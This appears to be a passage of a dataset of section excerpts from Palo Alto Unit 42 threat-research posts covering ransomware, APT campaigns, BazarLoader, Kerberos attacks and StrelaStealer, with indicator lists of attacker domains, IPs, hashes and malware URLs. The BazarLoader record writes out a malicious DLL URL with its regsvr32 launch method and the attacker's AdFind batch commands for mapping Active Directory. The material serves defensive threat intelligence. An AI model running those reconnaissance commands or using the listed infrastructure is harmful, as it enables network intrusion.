\ninezeng@onionmail[.]org \nlonnieguzman@onionmail[.]org \nthomasmoore@onionmail[.]org\nDomains:\nvsociethok6sbprvevl4dlwbqrzyhxcxaqpvcqt5belwvsuxaxsutyad[.]onion \nQu5dci2k25x2imgki2dbhcwegqqsqsrjj5d3ugcc5kpsgbtj2psaedqd[.]onion \nWavbeudogz6byhnardd2lkp2jafims3j7tj6k6qnywchn2csngvtffqd[.]onion \ngunyhng6pabzcurl7ipx2pbmjxpvqnu6mxf2h3vdeenam34inj4ndryd[.]onion", "source": "Palo"}, {"title": "Introduction", "content": "The earliest known sample of LockerGoga (SHA256:bdf36127817413f625d2625d3133760af724d6ad2410bea7297ddc116abc268f) we found was submitted to VirusTotal on January 24. We believe this sample was used in the attack on Altran.  We do not know how the ransomware infected Altran's networks or propagated once there.", "source": "Palo"}, {"title": "Conclusion", "content": "LockerGoga's developers continue to add capabilities and launch new attacks.  The addition of WS2_32.dll and use of undocumented Windows API calls indicates a level of sophistication beyond typical ransomware authors. The former could lead to the eventual inclusion of C2 communication or automated propagation, and the latter requires some working knowledge of Windows internals.\nThese features raise more questions about the actor's intent as ransomware is typically one of the least advanced forms of malware:  Are they motivated by profits or something else? Has the motive change over time?  Why would developers put such effort into their work only to partially encrypt files. Why do they include an email address and not seek payment through more frequently used cryptocurrencies?\nWe do not know if any of the victims have paid the ransom and were able to successfully retrieve their data. We do know that this ransomware has caused significant harm. The damage could increase significantly if  the attackers continue to refine this ransomware. Unit 42 will continue to monitor LockerGoga and report on new activity.\nWildFire properly identifies all of the malware samples listed in this report as malicious. Traps prevents execution of LockerGoga samples and AutoFocus customers can view LockerGoga samples using theLockerGogatag.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visitwww.cyberthreatalliance.org.", "source": "Palo"}, {"title": "Indicators", "content": "LockerGoga Samples\nae7e9839b7fb750128147a9227d3733dde2faacd13c478e8f4d8d6c6c2fc1a55\nf474a8c0f66dee3d504fff1e49342ee70dd6f402c3fa0687b15ea9d0dd15613a\nffab69deafa647e2b54d8daf8c740b559a7982c3c7c1506ac6efc8de30c37fd5\nc1670e190409619b5a541706976e5a649bef75c75b4b82caf00e9d85afc91881\n65d5dd067e5550867b532f4e52af47b320bd31bc906d7bf5db889d0ff3f73041\n31fdce53ee34dbc8e7a9f57b30a0fbb416ab1b3e0c145edd28b65bd6794047c1\n32d959169ab8ad7e9d4bd046cdb585036c71380d9c45e7bb9513935cd1e225b5\ne00a36f4295bb3ba17d36d75ee27f7d2c20646b6e0352e6d765b7ac738ebe5ee\n6d8f1a20dc0b67eb1c3393c6c7fc859f99a12abbca9c45dcbc0efd4dc712fb7c\n79c11575f0495a3daaf93392bc8134c652360c5561e6f32d002209bc41471a07\n050b4028b76cd907aabce3d07ebd9f38e56c48c991378d1c65442f9f5628aa9e\n1f9b5fa30fd8835815270f7951f624698529332931725c1e17c41fd3dd040afe\n276104ba67006897630a7bdaa22343944983d9397a538504935f2ec7ac10b534\n88d149f3e47dc337695d76da52b25660e3a454768af0d7e59c913995af496a0f\nc97d9bbc80b573bdeeda3812f4d00e5183493dd0d5805e2508728f65977dda15\n06e3924a863f12f57e903ae565052271740c4096bd4b47c38a9604951383bcd1\na845c34b0f675827444d6c502c0c461ed4445a00d83b31d5769646b88d7bbedf\n7bcd69b3085126f7e97406889f78ab74e87230c11812b79406d723a80c08dd26\nba15c27f26265f4b063b65654e9d7c248d0d651919fafb68cb4765d1e057f93f\neda26a1cd80aac1c42cdbba9af813d9c4bc81f6052080bc33435d1e076e75aa0\n7852b47e7a9e3f792755395584c64dd81b68ab3cbcdf82f60e50dc5fa7385125\n14e8a8095426245633cd6c3440afc5b29d0c8cd4acefd10e16f82eb3295077ca\n47f5a231f7cd0e36508ca6ff8c21c08a7248f0f2bd79c1e772b73443597b09b4\nf3c58f6de17d2ef3e894c09bc68c0afcce23254916c182e44056db3cad710192\n9128e1c56463b3ce7d4578ef14ccdfdba15ccc2d73545cb541ea3e80344b173c\nc3d334cb7f6007c9ebee1a68c4f3f72eac9b3c102461d39f2a0a4b32a053843a\n6e69548b1ae61d951452b65db15716a5ee2f9373be05011e897c61118c239a77\n8cfbd38855d2d6033847142fdfa74710b796daf465ab94216fbbbe85971aee29\nbdf36127817413f625d2625d3133760af724d6ad2410bea7297ddc116abc268f\n5b0b972713cd8611b04e4673676cdff70345ac7301b2c23173cdfeaff564225c\nc7a69dcfb6a3fe433a52a71d85a7e90df25b1db1bc843a541eb08ea2fd1052a4", "source": "Palo"}, {"title": "Introduction", "content": "This article exposes an extortion operation that targeted cloud environments and leveraged the dynamic scalability of cloud platforms. It also leveraged multiple cloud services to successfully hold organizations' cloud data to ransom.\nThe events discussed within this post took place within a cloud environment where the account operators deployed and used overly permissive IAM credentials. These credentials allowed the threat actors to perform several operations that would not have been possible if the account operators followedcloud security best practices.\nAttackers obtained initial access to victims' cloud environments through exposed environment files (.env) files within the victim organization's web applications. Due to the security risks associated with authentication data stored inside.envfiles,organizations should followsecurity best practicesto never expose environment files publicly.\nEnvironment files allow users to define configuration variables used within applications and platforms. These files often contain secrets such as hard-coded cloud provider access keys, software-as-a-service (SaaS) API keys and database login information then used by the threat actor for initial access.\nThe attack pattern of scanning the internet for domains and exploiting credentials obtained from exposed environment variable files follows a larger pattern we believe propagates through other compromised AWS environments.\nNote: The presence of these secrets resulted from misconfigurations of victim organizations who inadvertently exposed their.envfiles. None of the listed vendors' applications or services had vulnerabilities or misconfigurations that resulted in this exposure.", "source": "Palo"}, {"title": "Conclusion", "content": "We identified a wide-scale extortion operation that resulted in the successful compromise of several cloud environments. The initial access used within the extortion campaign was the direct result of exposed environment files (.env) files within the victim organization's web applications.\nBy targeting.envfiles, the threat actor was able to collect the exposed environment files of at least 110,000 domains. We identified over 90,000 unique leaked environment variables of which 7,000 were associated with cloud services and 1,500 were associated with social media accounts, oftentimes including account names in addition to authentication secret keys.", "source": "Palo"}, {"title": "Indicators", "content": "URL\nhttps[:]//github[.]com/brentp/gargs/releases/download/v0.3.9/gargs_linux(not malicious, used by the lambda function)\nIPv4\n109.70.100[.]71 \n144.172.118[.]62 \n176.123.8[.]245 \n185.100.85[.]25 \n185.100.87[.]41 \n185.220.101[.]190 \n185.220.101[.]19 \n185.220.101[.]21 \n185.220.101[.]29 \n185.220.101[.]30 \n185.220.101[.]86 \n185.220.103[.]113 \n192.42.116[.]181 \n192.42.116[.]187 \n192.42.116[.]18 \n192.42.116[.]192 \n192.42.116[.]199 \n192.42.116[.]201 \n192.42.116[.]208 \n192.42.116[.]218 \n198.251.88[.]142 \n199.249.230[.]161 \n45.83.104[.]137 \n62.171.137[.]169 \n80.67.167[.]81 \n89.234.157[.]254 \n94.142.241[.]194 \n95.214.234[.]103\n125.20.131[.]190 \n196.112.184[.]14 \n46.150.66[.]226 \n49.37.170[.]97\n139.99.68[.]203 \n141.95.89[.]92 \n146.70.184[.]10 \n178.132.108[.]124 \n193.42.98[.]65 \n193.42.99[.]169 \n193.42.99[.]50 \n193.42.99[.]58 \n195.158.248[.]220 \n195.158.248[.]60 \n45.137.126[.]12 \n45.137.126[.]16 \n45.137.126[.]18 \n45.137.126[.]41 \n45.94.208[.]42 \n45.94.208[.]63 \n45.94.208[.]76 \n45.94.208[.]85 \n72.55.136[.]154 \n95.214.216[.]158 \n95.214.217[.]173 \n95.214.217[.]224 \n95.214.217[.]242 \n95.214.217[.]33\nHash\nSHA256 forLambda.sh-64e6ce23db74aed7c923268e953688fa5cc909cc9d1e84dd46063b62bd649bf6\nUpdated title Sept. 3, 2024, at 1:1o p.m. PT for clarity.", "source": "Palo"}, {"title": "Introduction", "content": "During our analysis of a July 2023 campaign targeting groups supporting Ukraine's admission into NATO, we discovered a new vulnerability for bypassing Microsoft's Mark-of-the-Web (MotW) security feature. This activity has been attributed by the community to the pro-Russian APT group known as Storm-0978 (also known as the RomCom Group, in reference to their use of the RomCom backdoor). This group used a highly complex and well-developed exploit chain leveraging a remote code execution (RCE) vulnerability in Microsoft Office designatedCVE-2023-36884to infect its targets with malware.\nOur investigation revealed a new exploit method related to CVE-2023-36884 that can bypass MotW. Microsoft awarded our team a bug bounty and assignedCVE-2023-36584(CVSS score 5) to this new vulnerability discovered during our investigation.\nThe lure for these attacks is a weaponized Microsoft Word document disguised as talking points for attendees of the July 2023 NATO Summit discussing Ukraine's entry into NATO. This article examines the file and provides technical insight into the attack's exploit chain that has not yet been publicly discussed.\nPalo Alto Networks customers receive protections from and mitigations for the threats discussed in this article.Cortex XDRandPrisma Clouddetect and prevent this exploit chain in its early and post-exploitation stages. Organizations can also engage theUnit 42 Incident Response teamfor specific assistance with this and other threats.", "source": "Palo"}, {"title": "Introduction", "content": "This exploit chain begins with the following lure:\nWhile monitoring Ukraine's threat landscape, our team observed an interesting Microsoft Word document (.docxfile)first submitted to VirusTotal on July 3, 2023, namedOverview_of_UWCs_UkraineInNATO_campaign.docx. The filename and content indicate it targeted participants at theJuly 2023 NATO Summitdiscussing Ukraine's entry into NATO.\nThis activity has been attributed by the community to a pro-Russian APT group known asStorm-0978(also known as the RomCom Group, in reference to their use of the RomCom backdoor). Below, Figure 1 shows a screenshot of this document.\nVirusTotal indicates this document was hosted at the following URL:\nhxxps://www.ukrainianworldcongress[.]info/sites/default/files/document/forms/2023/Overview_of_UWCs_UkraineInNATO_campaign.docx\nThe above link indicates this document was most likely distributed through email, with the email text containing a link to the.docxfile. The document's creation date and the registration date of domainukrainianworldcongress[.]infoare both June 26, 2023. This timing suggests an email-based campaign with a link to the.docxfile targeted organizations or individuals attending the July 2023 NATO Summit.\nWhen the file was initially submitted to VirusTotal, 27 of the 62 AV engines identified it as malicious. While we found no evidence this lure was sent to any of our customers, we conducted in-depth analysis to ensure coverage of any associated vulnerabilities.\nOur investigation revealed a new vulnerability for CVE-2023-36584. The next section of this article provides detailed technical analysis and fully explains each step of the full exploit chain.", "source": "Palo"}, {"title": "Conclusion", "content": "Starting with the malicious .docx file, our analysis of the July 2023 campaign targeting groups supporting Ukraine's admission into NATO revealed a more complex exploit than originally reported. Our analysis of this chain revealed a chain of more than 20 steps that not only exploitedCVE-2023-36884, but included additional vulnerabilities to bypass protections in Microsoft Office and Windows.\nMicrosoft awarded our team a bug bounty and assignedCVE-2023-36584to a new vulnerability discovered in our research.\nPalo Alto Networks customers receive protection from and mitigation for these exploits the following ways:\nCortex XDRcustomers received protection from these exploit methods before they were discovered. \nPrisma Cloudis capable of detecting and preventing cloud application deployment that contains exploits against eitherCVE-2023-36884orCVE-2023-36584. Protection from these exploits was available out of the box.\nIf you think you may have been compromised or have an urgent matter, contact theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nFor additional information about how Palo Alto Networks customers receive protection from this exploit chain,see our previous article about CVE-2023-36884.\nPalo Alto Networks has shared our findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "The following files are associated with the July 2023 campaign lureOverview_of_UWCs_UkraineInNATO_campaign.docxand have been posted to VirusTotal. Of note, SHA256 hashes for some of these files are different for each infection.\nRead: SHA256 hash - Filename\na61b2eafcf39715031357df6b01e85e0d1ea2e8ee1dfec241b114e18f7a1163f - Overview_of_UWCs_UkraineInNATO_campaign.docx \n0896e7c5433b2d426a30a43e7f4ef351fa870be8bd336952a0655392f8f8052d - word/document.xml \nb5731baa7920b4649add429fc4a025142ce6a1e1adacb45850470ca4562d5e37 - word/_rels/document.xml.rels \ne7cfeb023c3160a7366f209a16a6f6ea5a0bc9a3ddc16c6cba758114dfe6b539 - afchunk.rtf \n3d0dae359325e8e96cf46459c38d086279865457379bd6380523727db350de43 - file001.url \n48142dc7fe28a5d8a849fff11cb8206912e8382314a2f05e72abad0978b27e90 - start.xml \nbfe3ebcc92a4a7d294b63ce0d7eba6313980d982709a27b337abe32651b63856 - file001.zip \nc94e2bfd4e2241fed42113049c84ac333fcff340cc202afe8926f8e885d5fca3 - 2222.chm \nf08cc922c5dab73f6a2534f8ceec8525604814ae7541688b7f65ac9924ace855 - 1111.htm \ncdc39ce48f8f587c536450a3bd0feb58bf40b59b310569797c1c9ae8d28b2914 - RFile.asp \nfd4fd44ff26e84ce6587413271cf7ff3960471a55eb0d51b0a9870b577d66f4a - file001.htm \n4fc768476ee92230db5dbc4d8cbca49a71f8433542e62e093c3ad160f699c98d - redir_obj.htm \n0adb2734a1ca0ccaf27d8a46c08b2fd1e19cb1fbd3fea6d8307851c691011f0f - file1.htm \n7a1494839927c20a4b27be19041f2a2c2845600691aa9a2032518b81463f83be - file1.mht \n20f58bd5381509072e46ad79e859fb198335dcd49c2cb738bd76f1d37d24c0a7 - fileH.htm \nee46f8c9769858aad6fa02466c867d7341ebe8a59c21e06e9e034048013bf65a - fileH.mht \nc187aa84f92e4cb5b2d9714b35f5b892fa14fec52f2963f72b83c0b2d259449d - ex001.url\nThe following network paths referenced in this research are associated with the July 2023 lure:\n\\\\104.234.239[.]26\\share1\\MSHTML_C7\\file001.url \n\\\\104.234.239[.]26\\share1\\MSHTML_C7\\ex001.url \nfile[:]//104.234.239[.]26/share1/MSHTML_C7/1/ \nfile[:]//104.234.239[.]26/share1/MSHTML_C7/ex001.zip/file001.vbs \nhxxp://74.50.94[.]156/MSHTML_C7/start.xml \nhxxp://74.50.94[.]156/MSHTML_C7/zip_k.asp?d= \nhxxp://74.50.94[.]156/MSHTML_C7/zip_k2.asp?d= \nhxxp://74.50.94[.]156/MSHTML_C7/zip_k3.asp?d= \nhxxps://www.ukrainianworldcongress[.]info/sites/default/files/document/forms/2023/Overview_of_UWCs_UkraineInNATO_campaign.docx", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 has identified malicious Chinese APT infrastructure masquerading as cloud backup services. Monitoring telemetry associated with two prominent Chinese APT groups, we observed network connections predominately originating from the country of Cambodia, including inbound connections originating from at least 24 Cambodian government organizations.\nWe assess with high confidence that these Cambodian government entities were targeted and remain compromised by Chinese APT actors. This assessment is due to the malicious nature and ownership of the infrastructure combined with persistent connections over a period of several months.\nCambodia and China maintain strong diplomatic and economic ties. Since Cambodiasigned on to China's Belt and Road Initiative (BRI) in 2013, the relationship between these two countries has grown steadily.\nIn recent years, China's most notable investment has been aproject to modernize Cambodia's Ream Naval Base. This project generated controversy and drew scrutiny from several Western nations due to initial attempts by both countries to conceal the project.\nAs the project nears completion this year, the naval base is on track to become China's first overseas outpost in Southeast Asia. As such, this project demonstrates how significant Cambodia is to China's ambitions of projecting power and expanding naval operations in the region.\nPalo Alto Networks customers receive protection from this malicious infrastructure through ourNext-Generation FirewallwithCloud-Delivered Security Services, includingDNS SecurityandAdvanced URL Filtering.", "source": "Palo"}, {"title": "Conclusion", "content": "Unit 42 identified Chinese APT-associated activity targeting Cambodia, including over 20 Cambodian government organizations across a range of key industries. This activity is believed to be part of a long-term espionage campaign.\nThe observed activity aligns with geopolitical goals of the Chinese government as it seeks to leverage their strong relations with Cambodia to project their power and expand their naval operations in the region. We encourage all organizations to leverage our findings to inform the deployment of protective measures to defend against this activity.\nProtection Recommendations\nTo defend against the threats described in this blog, Palo Alto Networks recommends organizations employ the following capabilities:\nNetwork Security: Delivered through aNext-Generation Firewall(NGFW) configured with machine learning enabled and cloud-delivered security services. This includes threat prevention,URL filtering,DNS securityand a malware prevention engine capable of identifying and blocking malicious samples and infrastructure. \nSecurity Automation: Delivered through aCortex XSOARorXSIAMsolution capable of providing SOC analysts with a comprehensive understanding of the threat derived by stitching together data obtained from endpoints, network, cloud and identity systems. \nContainer Security: Delivered through the Palo Alto NetworksPrisma Cloudadvanced container security features for container runtime environments to ensure detection and prevention of known malicious executables. Advanced URL Filtering blocks malicious IoCs related to this operation.WildFireintegration for cloud-delivered malware analysis service accurately identifies known samples as malicious.\nProtections and Mitigations\nPalo Alto Networks customers receive protection from the threats discussed above through the following products:\nAdvanced URL Filteringblocks web requests to malicious URLs \nDNS Securityeffectively prevents the resolution of C2 hostnames \nContainer Runtime Inspectionprevents DNS requests from malicious processes\nIf you think you might have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "Domains\napi.infinitycloud[.]info \nconnect.infinitycloud[.]info \nns.infinitycloud[.]info \nconnect.infinitybackup[.]net \nns1.infinitybackup[.]net \nshare.infinitybackup[.]net \nfile.wonderbackup[.]com \nlogin.wonderbackup[.]com \nsync.wonderbackup[.]com \nupdate.wonderbackup[.]com \nads.teleryanhart[.]com \nmfi.teleryanhart[.]com \ndfg.ammopak[.]site \nfwg.ammopak[.]site \njlp.ammopak[.]site \nkwe.ammopak[.]site \nlxo.ammopak[.]site \nconnect.clinkvl[.]com\nInfrastructure IP Addresses\n165.232.186[.]197 \n167.71.226[.]171 \n104.248.153[.]204 \n143.110.189[.]141 \n172.105.34[.]34 \n194.195.114[.]199\nSSL Certificate SHA-1 Fingerprint\nB8CFF709950CFA86665363D9553532DB9922265C", "source": "Palo"}, {"title": "Introduction", "content": "BazarLoader is Windows-based malware spread through various methods involving email. These infections provide backdoor access that criminals use to determine whether the host is part of an Active Directory (AD) environment. If so, criminals deploy Cobalt Strike and perform reconnaissance to map the network. If the results indicate a high-value target, criminals attempt lateral movement and will often deploy ransomware like Conti or Ryuk.\nThis blog reviews a recent BazarLoader infection, how it led to Cobalt Strike, and how Cobalt Strike led to network reconnaissance. If you discover similar activity within your network, you could be a target for ransomware.\nOrganizations with decent spam filtering, proper system administration and up-to-date Windows hosts have a much lower risk of infection. Palo Alto Networks customers are further protected from this threat. OurThreat Preventionsecurity subscription for the Next-Generation Firewall detects the BazarLoader sample from this infection and similar samples. Endpoint detection likeCortex XDRcan prevent Cobalt Strike activity and criminal access to your network.", "source": "Palo"}, {"title": "Conclusion", "content": "This case study reveals one example of an initial malware infection moving to Cobalt Strike, followed by reconnaissance activity. When attackers use Cobalt Strike, they can also perform other types of reconnaissance in an AD environment.\nIf the AD environment is a high-value target, the attacker's next step is lateral movement and gaining access to the domain controller and other servers within the network.\nThis is a common pattern seen before attackers hit an organization with ransomware.\nOrganizations with decent spam filtering, proper system administration and up-to-date Windows hosts have a much lower risk of infection. Palo Alto Networks customers are further protected from this threat. Our Threat Prevention security subscription for the Next-Generation Firewall detects this and similar BazarLoader samples. Endpoint detection likeCortex XDRcan prevent Cobalt Strike activity and criminal access to your network.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.\nIndicators of Compromise\nExcel file with macros for BazarLoader, SHA256 hash:8662d511c7f1bef3a6e4f6d72965760345b57ddf0de5d3e6eae4e610216a39c1File size: 332,087 bytesFile name:Documents new.xlsb\nMalicious DLL for BazarLoader retrieved by above Excel macro, SHA256 hash:caa03c25583ea24f566c2800986def73ca13458da6f9e888658f393d1d340ba1File size: 459,776 bytesOnline location:hxxps://pawevi[.]com/lch5.dllInitial saved location:C:\\Users\\[username]\\tru.dllFinal location:C:\\Users\\[username]\\AppData\\Local\\Temp\\Damp\\kibuyuink.exeRun method:regsvr32.exe /s [filename]\nMalicious DLL for Cobalt Strike, SHA256 hash:73b9d1f8e2234ef0902fca1b2427cbef756f2725f288f19edbdedf03c4cadab0File size: 443,904 bytesFile location:C:\\Users\\[username]\\AppData\\Roaming\\nubqabmlkp.iowdRun method:rundll32.exe [filename],Entrypoint\nADfind command-line tool for enumerating AD environment, SHA256 hash:b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682File size: 1,394,176 bytesFile location:C:\\ProgramData\\AdFind.exe\nBatch file to run ADfind, SHA256 hash:1e7737a57552b0b32356f5e54dd84a9ae85bb3acff05ef5d52aabaa996282dfbFile size: 385 bytesFile location:C:\\ProgramData\\adf.bat\nContents ofadf.bat:\nadfind.exe -f \"(objectcategory=person)\" > ad_users.txtadfind.exe -f \"objectcategory=computer\" > ad_computers.txtadfind.exe -f \"(objectcategory=organizationalUnit)\" > ad_ous.txtadfind.exe -sc trustdmp > trustdmp.txtadfind.exe -subnets -f (objectCategory=subnet)> subnets.txtadfind.exe -f \"(objectcategory=group)\" > ad_group.txtadfind.exe -gcb -sc trustdmp > trustdmp.txt\nAdditional Resources\nBazarCall Method: Call Centers Help Spread BazarLoader Malware\u2013 Unit 42, Palo Alto NetworksTA551 BazarLoader to Cobalt Strike\u2013 Internet Storm Center\"Stolen Images Evidence\" BazarLoader to Cobalt Strike\u2013 @Unit42_Intel\"Stolen Images Evidence\"BazarLoader to Cobalt Strike\u2013 malware-traffic-analysis.netStolen Images Evidence\" BazarLoader to Cobalt Strike to PrintNightmare\u2013 @Unit42_IntelBazarLoader to Cobalt Strike\u2013 @Unit42_IntelBazarLoader to Cobalt Strike to Anchor malware\u2013 Internet Storm CenterTA551 BazarLoader to Cobalt Strike\u2013 malware-traffic-analysis.net", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers show new detection methods that help improve detection of a new line of Kerberos attacks, which allow attackers to modify Kerberos tickets to maintain privileged access. The most well-known example of this is the Golden Ticket attack, which allows threat actors to forge a ticket to masquerade as a high-privileged user.\nThese two newer attacks extend the Golden Ticket attack in that the forged tickets are not created from scratch, but instead based on modifying an existing ticket to include high-privileged access. We'll discuss the difference between these three types of attacks, to explain why the newer ones are harder to detect.\nThe broad usage of Active Directory has made Kerberos attacks the bread and butter of many threat actors. Researchers have discovered the following new attack techniques that allow an adversary to gain unconstrained access to all services and resources within an Active Directory (AD) domain:\nDiamond Ticket \nSapphire Ticket\nBecause of their similarity to the well-known Golden Ticket attack, threat actors might also use these attacks in future campaigns. People can better protect themselves by employing the new detection methods we'll discuss for these new Kerberos attacks.\nPalo Alto Networks customers receive improved detection for the attacks discussed in this blog through Cortex XDR.", "source": "Palo"}, {"title": "Conclusion", "content": "In this blog, after a brief primer on relevant Kerberos terms and the attacks themselves, we discussed the privileges required to perform such attacks and the importance of monitoring different forged ticket attacks. Additionally, we examined possible detection ideas that might help cover Golden Ticket attacks as well as new attack methods.\nForged ticket attacks might be hard to detect with a cursory glance, since they can initially appear to be legitimate. However, if enough information is collected about suspicious network activity, malicious tool usage, or Windows events, we might be able to detect some of the most effective Kerberos attacks.\nIn addition, deploying a security platform such asCortex XDRcan provide an additional layer of protection and visibility to the various stages of the attack.", "source": "Palo"}, {"title": "Appendix", "content": "Constrained delegation\u2013 Provides a safer form of delegation that could be used by services. When it is configured, constrained delegation restricts the services to which the specified server can act on the behalf of a user.\nDCSync Attack\u2013 Abusing a Windows Domain Controller's application programming interface (API) to simulate the replication process from a remote domain controller.\nDomain controller (DC)\u2013 A server computer that responds to security authentication requests within a computer network domain. It is a network server that is responsible for allowing host access to domain resources. Serves as the KDC in AD environments.\nENC-TKT-IN-SKEY\u2013 The option indicates that the ticket for the end server is to be encrypted in the session key from the additional TGT provided.\nGolden Ticket attack\u2013 Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT) called \"Golden ticket\" which enable adversaries to generate authentication material for any account in Active Directory.\nKerberos\u2013 Kerberos is a network authentication protocol that is primarily used in Active Directory environments.\nKerberos delegation\u2013 Kerberos delegation is a delegation setting that allows applications to request end-user access credentials to access resources on behalf of the originating user.\nKey Distribution Center (KDC)\u2013 A key distribution center (KDC) in cryptography is a system that is responsible for providing keys to the users in a network that shares sensitive or private data.\nKRBTGT account\u2013 A local default account that acts as a service account for the KDC service.\nPA-FOR-USER\u2013 A struct used to identify the user, on whose behalf the service requests the service ticket, using the user name and user realm.\nPrivileged Attribute Certificate (PAC)\u2013 The PAC is a structure that conveys authorization-related information provided by domain controllers (DCs). The PAC is used by authentication protocols that verify identities to transport authorization information, which controls access to resources.\nS4U\u2013 Kerberos extensions in order to avoid keeping the user's TGT in memory. It consists of S4U2Self and S4U2Proxy.\nS4U2Proxy\u2013 Will allow a service to authenticate to a different service.\nS4U2Self\u2013 Allows a service to ask for a ticket to itself on behalf of any user.\nService Principal Names (SPN)\u2013 A unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account.\nTicket Granting Server (TGS)\u2013 A TGS validates the use of a ticket for a specified purpose, such as network service access.\nTicket Granting Ticket (TGT)\u2013 A user authentication token issued by the KDC that is used to request access tokens from the Ticket Granting Service (TGS) for specific resources/systems joined to the domain.\nU2U authentication\u2013 A method to perform authentication when the verifier does not have access to a long-term service key. To address this problem, the Kerberos protocol allows the client to request that the ticket issued by the KDC be encrypted using a session key from a TGT issued to the party that will verify the authentication.\nUpdated December 13, 2022, at 8:25 a.m. PT.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 regularly monitors the cyberthreat landscape, including trends in extortion and ransomware. Ransomware actors continue to evolve to increase the effectiveness of their attacks and the likelihood that organizations will pay what is demanded. In our 2025 Unit 42 Global Incident Response Report, we found that 86% of incidents involved business disruption, spanning operational downtime, reputational damage or both.\nIn this survey of recent trends, we share qualitative observations based on incident response cases and the broader threat landscape. These include:\nThreat actors claiming compromises that can't be substantiated \nNation-state actors working with ransomware actors \nUse of tools to disable endpoint security sensors \nAttacks on more types of systems, including cloud \nInsider threats leading to extortion\nWe also share insights about public reports of ransomware compromises posted on threat actors' leak sites. This includes:\nThe most active ransomware leak sites \nActivity by month \nActivity by country \nIndustries most affected by ransomware\nPalo Alto Networks customers are better protected from ransomware threats through ourNetwork Securitysolutions andCortexline of products.\nUnit 42 can help organizations proactively prepare to mitigate the threat of ransomware through ourRansomware Readiness Assessment.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Unit 42 continues to monitor ransomware threats, through incident response cases, observation of dark web leak sites and other sources of telemetry. Ransomware remains a significant and evolving threat, especially as threat actors continue to evolve more ways of gaining access. The involvement of nation-state groups, combined with low barriers to entry for ransomware affiliates, means that cybercriminals at all skill levels may get involved with ransomware.\nOrganizations should stay aware of trends in ransomware and employ a defense-in-depth strategy for protection. While it is important to maintain backups, organizations should be prepared for ransomware actors to apply other forms of pressure (such as reputational pressure) to force a ransom payment even if the organization has not lost access to data. For more about Unit 42's recent observations of ransomware trends, please read the2025 Global Incident Response Report.", "source": "Palo"}, {"title": "Introduction", "content": "StrelaStealer malware steals email login data from well-known email clients and sends them back to the attacker's C2 server. Upon a successful attack, the threat actor would gain access to the victim's email login information, which they can then use to perform further attacks. Since the first emergence of the malware in 2022, the threat actor behind StrelaStealer has launched multiple large-scale email campaigns, and there is no sign of them slowing down.\nRecently, our researchers have identified a wave of large-scale StrelaStealer campaigns impacting over 100 organizations across the EU and U.S. These campaigns come in the form of spam emails with attachments that eventually launch the StrelaStealer's DLL payload.\nIn an attempt to evade detection, attackers change the initial email attachment file format from one campaign to the next, to prevent detection from the previously generatedsignature or patterns. The malware author often updates the DLL payload with better obfuscation and anti-analysis tricks, which makes it increasingly difficult for analysts and security products to analyze.\nThis article delves deeper into the timeline of these more recent attacks and the evolving tactics employed by the malware.\nThrough detection and intelligence provided byAdvanced WildFire, Palo Alto Networks customers are better protected from StrelaStealer through the following products:\nCortex XDRwith Advanced WildFire is able to help detect new variants of StrelaStealer. Cortex XDR helps prevent StrelaStealer's attack chain. \nNext-Generation FirewallswithCloud-Delivered Security Services, including Advanced WildFire detection,Advanced URL FilteringandDNS Securitycategorize known C2 domains and IPs as malicious. \nPrisma Cloud Defenderagents should be deployed on cloud-based Windows VMs to ensure they are protected from these known malicious binaries. WildFire signatures can be used by both Palo Alto Networks cloud services to ensure cloud-based Windows VM runtime operations are being analyzed and those resources are protected. \nOrganizations can also engage theUnit 42 Incident Response teamto help with a compromise or to provide a proactive assessment to lower your risk.", "source": "Palo"}, {"title": "Introduction", "content": "StrelaStealer malware is an email credential stealer first documented by DCSO_CyTec in theirblog on Mediumpublished on Nov. 8, 2022. Since the first emergence of the malware, the threat actor behind StrelaStealer has launched multiple large-scale email campaigns, typically across the EU and U.S.\nFor example, the last large-scale campaign launched in 2023 was around the November time frame. Our researchers have observed a new campaign launched in late January 2024 targeting multiple industries across the EU and U.S.\nThe basic goal of the StrelaStealer has not changed much, and the payload DLL is still identifiable with thestrelastring. However, we can see that the threat actor has updated the malware in an attempt to evade detection.\nThis new variant of StrelaStealer is now delivered through a zipped JScript and it employs an updated obfuscation technique in the DLL payload. We will provide more technical analysis and detail in this article.", "source": "Palo"}, {"title": "Conclusion", "content": "StrelaStealer malware is an active email credential stealer that is always evolving. With each new wave of email campaigns, threat actors update both the email attachment, which initiates the infection chain, and the DLL payload itself. Attackers do this to evade detection by security vendors.\nInformation stealers are not new to the threat landscape. Though not exactly novel, the various evasion techniques and updates employed by StrelaStealer are effective at evading detection from more reactivesignature or pattern-based solutions.", "source": "Palo"}, {"title": "Introduction", "content": "This past year Unit 42 has seen a resurgence of keylogger activity and it seems like every week a new research blog comes out talking about one of four popular families:KeyBase,iSpy,HawkEye, orPredatorPain. These blogs usually delve into the technical workings of the threats, discuss their 